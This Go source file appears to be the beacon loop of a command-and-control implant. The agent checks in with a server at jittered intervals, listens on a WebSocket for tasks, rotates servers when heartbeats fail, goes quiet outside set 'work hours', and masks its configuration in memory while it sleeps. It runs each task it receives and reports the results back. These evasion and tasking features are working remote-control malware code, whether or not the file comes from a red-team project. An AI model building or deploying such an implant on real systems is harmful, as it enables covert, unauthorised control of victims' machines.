package beacon

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"time"

	"bytecode-agent/internal/comms"
	"bytecode-agent/internal/config"
	"bytecode-agent/internal/executor"
)

// Loop runs the main beacon loop forever
// Loop runs the main beacon loop forever
func Loop(client *comms.Client, wsClient *comms.WSClient, cfg *config.Config) error {
	log.Println("[BEACON] Starting beacon loop...")
	log.Printf("[BEACON] Interval: %d-%ds (jitter)\n", cfg.BeaconMin, cfg.BeaconMax)

	// Start WebSocket connection in background
	go func() {
		for {
			err := wsClient.Connect()
			if err == nil {
				// Wait for connection to close
				for {
					if wsClient.Conn == nil {
						break
					}
					time.Sleep(5 * time.Second)
				}
			}
			log.Printf("[WS] Disconnected, retrying in 10s...\n")
			time.Sleep(10 * time.Second)
		}
	}()

	// Perform initial beacon immediately
	log.Println("[BEACON] Performing initial heartbeat...")
	if _, err := client.Beacon(); err != nil {
		log.Printf("[BEACON] Initial heartbeat failed: %v\n", err)
		return err
	}

	for {
		// Check work hours
		if cfg.WorkHours.Enabled {
			now := time.Now().Hour()
			if now < cfg.WorkHours.Start || now >= cfg.WorkHours.End {
				log.Printf("[SCHED] Outside work hours (%d-%d). Sleeping for 1 hour...\n", cfg.WorkHours.Start, cfg.WorkHours.End)
				time.Sleep(1 * time.Hour)
				continue
			}
		}

		// Calculate next sleep
		sleepDuration := calculateNextSleep(cfg.BeaconMin, cfg.Jitter)
		log.Printf("[BEACON] Next heartbeat in %ds...\n", int(sleepDuration.Seconds()))
		
		timer := time.NewTimer(sleepDuration)

		// Mask configuration before sleep
		cfg.Mask()

		select {
		case <-timer.C:
			// Unmask to perform heartbeat
			cfg.Unmask()
			
			log.Printf("[BEACON] Sending heartbeat to %s...\n", cfg.GetServerURL())
			resp, err := client.Beacon()
			if err != nil {
				log.Printf("[BEACON] Heartbeat failed: %v. Rotating server...\n", err)
				cfg.RotateServer()
				
				// Wait before retry on failure
				time.Sleep(30 * time.Second)
				continue
			}

			if resp.Task != nil {
				processTask(resp.Task, client, cfg)
			}

		case task := <-wsClient.TaskChan:
			// Unmask to process real-time task
			cfg.Unmask()
			
			log.Printf("[WS] Processing real-time task: %s\n", task.ID[:8])
			processTask(task, client, cfg)
		}
	}
}

// processTask handles task execution and result reporting
func processTask(task *comms.TaskPayload, client *comms.Client, cfg *config.Config) {
	log.Printf("[TASK] Received: type=%s id=%s\n", task.Type, task.ID[:8])

	// Handle sleep_update specially
	if task.Type == "sleep_update" {
		handleSleepUpdate(task, cfg)
	}

	// Execute the task
	result := executor.Execute(task, client.APIKey)
	log.Printf("[TASK] Completed: status=%s\n", result.Status)

	// Send result back
	if err := client.SendResult(result); err != nil {
		log.Printf("[RESULT] Failed to send: %v\n", err)
	} else {
		log.Println("[RESULT] Sent successfully")
	}
}


// handleSleepUpdate updates the beacon interval from a task payload
func handleSleepUpdate(task *comms.TaskPayload, cfg *config.Config) {
	payloadBytes, err := json.Marshal(task.Payload)
	if err != nil {
		return
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return
	}

	if interval, ok := payload["interval"].(float64); ok {
		newInterval := int(interval)
		if newInterval > 0 {
			cfg.BeaconMin = newInterval
			log.Printf("[CONFIG] Beacon interval updated: %ds\n", cfg.BeaconMin)
		}
	}

	if jitter, ok := payload["jitter"].(float64); ok {
		cfg.Jitter = int(jitter)
		log.Printf("[CONFIG] Jitter updated: %d%%\n", cfg.Jitter)
	}

	if workHours, ok := payload["work_hours"].(map[string]interface{}); ok {
		if enabled, ok := workHours["enabled"].(bool); ok {
			cfg.WorkHours.Enabled = enabled
		}
		if start, ok := workHours["start"].(float64); ok {
			cfg.WorkHours.Start = int(start)
		}
		if end, ok := workHours["end"].(float64); ok {
			cfg.WorkHours.End = int(end)
		}
		log.Printf("[CONFIG] Work hours updated: %v\n", cfg.WorkHours)
	}
}

// calculateNextSleep returns a duration based on interval and jitter percentage
func calculateNextSleep(interval int, jitterPct int) time.Duration {
	if jitterPct <= 0 {
		return time.Duration(interval) * time.Second
	}

	// Calculate jitter range
	jitterRange := float64(interval) * (float64(jitterPct) / 100.0)
	if jitterRange <= 0 {
		return time.Duration(interval) * time.Second
	}

	// Add or subtract up to jitterRange
	offset := (rand.Float64() * 2 * jitterRange) - jitterRange
	final := float64(interval) + offset

	if final < 1 {
		final = 1
	}

	return time.Duration(final) * time.Second
}

// FormatDuration formats a duration for logging
func FormatDuration(d time.Duration) string {
	return fmt.Sprintf("%.1fs", d.Seconds())
}
